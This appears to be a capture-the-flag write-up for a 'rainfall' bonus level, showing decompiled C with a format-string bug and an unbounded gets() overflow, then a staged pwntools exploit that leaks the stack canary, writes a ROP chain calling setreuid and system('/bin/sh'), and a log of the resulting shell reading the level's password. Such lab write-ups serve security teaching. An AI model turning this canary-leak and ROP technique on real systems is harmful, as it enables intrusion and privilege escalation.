Analyzing the decompiled `handle_command` function reveals a command-dispatch loop containing both a format string vulnerability and an unbounded stack buffer overflow within the `SEND:` branch:

```c
void handle_command(void) {
    char input[64];
    char buffer[64];
    unsigned int conn_idx;

    while (1) {
        info_leak();

        printf("[SENDAI] Command: ");
        fflush(stdout);

        if (fgets(input, 64, stdin) == NULL) {
            break;
        }

        input[strcspn(input, "\n")] = '\0';

        if (strncmp(input, "CONNECT:", 8) == 0) {
            conn_idx = strtoul(input + 8, NULL, 10);
            if (conn_idx > 7) {
                continue;
            }

            conns[conn_idx].connected = 1;
            printf("[SENDAI] Connected to %s:%u\n", conns[conn_idx].hostname, conns[conn_idx].port);
        }
        else if (strncmp(input, "SEND:", 5) == 0) {
            conn_idx = strtoul(input + 5, NULL, 10);
            if (conn_idx > 7 || conns[conn_idx].connected == 0) {
                continue;
            }

            printf("[SENDAI] Data for conn %u: ", conn_idx);
            fflush(stdout);

            gets(buffer);

            printf("[SENDAI] Sent: ");
            printf(buffer);
            putchar('\n');
        }
        else if (strncmp(input, "DISCONNECT:", 11) == 0) {
            conn_idx = strtoul(input + 11, NULL, 10);
            if (conn_idx > 7) {
                continue;
            }

            if (conns[conn_idx].disconnect != NULL) {
                conns[conn_idx].disconnect(conn_idx);
            }
        }
        else if (strncmp(input, "QUIT", 4) == 0) {
            break;
        }
        else {
            puts("[SENDAI] Unknown command.");
        }
    }
}

```

The attack executes in four structured stages:

1. **Establish Connection (State Prerequisite):**
To satisfy the `conns[conn_idx].connected != 0` check required by `SEND:`, we first send `CONNECT:0`.
```python
# STAGE 1: Connect
p.recvuntil(b"[SENDAI] Command: ")
p.sendline(b"CONNECT:0")

```


2. **Canary Leak via Format String:**
Using `SEND:0`, the subsequent `printf(buffer)` allows leaking the stack canary.
```python
# STAGE 2: Retrieve Canary
p.recvuntil(b"[SENDAI] Command: ")
p.sendline(b"SEND:0")
p.recvuntil(b"[SENDAI] Data for conn 0: ")
p.sendline(canary_idx)
canary_string = p.recvline().strip()[len(b"[SENDAI] Sent: "):]
canary = int(canary_string, 16)

```


3. **Buffer Overflow & ROP Injection:**
Using `SEND:0` a second time, `gets(buffer)` reads an unbounded payload. We overwrite the 136-byte offset, restore the leaked canary, pass dummy `RBP` bytes, and place our ROP chain (`setreuid(1027, 1027)` and `system("/bin/sh")`).
```python
# STAGE 3: Send Exploit Payload
p.recvuntil(b"[SENDAI] Command: ")
p.sendline(b"SEND:0")
offset = 136 
payload = b'\x00' * offset + p64(canary) + p64(0) + rop_chain
p.sendline(payload)

```


4. **Trigger Epilogue & Execution:**
Because the overflow targets the stack frame of `handle_command`, control flow hijacking occurs only when the function returns. Sending `QUIT` breaks the while-loop and triggers the `leave; ret` epilogue.
```python
# STAGE 4: Break Loop and Trigger ROP
p.recvuntil(b"[SENDAI] Command: ")
p.sendline(b"QUIT")

```



result:

```sh
bonus03@rainfall:~$ echo "" > exploit.py && vim exploit.py && python3 exploit.py
[+] Starting local process '/home/bonus03/sendai': pid 1575
[*] Switching to interactive mode
$ ls
exploit.py  sendai
$ whoami
flagbonus03
$ cat /home/$(whoami)/.pass
mrc2jp0jsvklrfhjsh5uuwmk26yzyxgq

```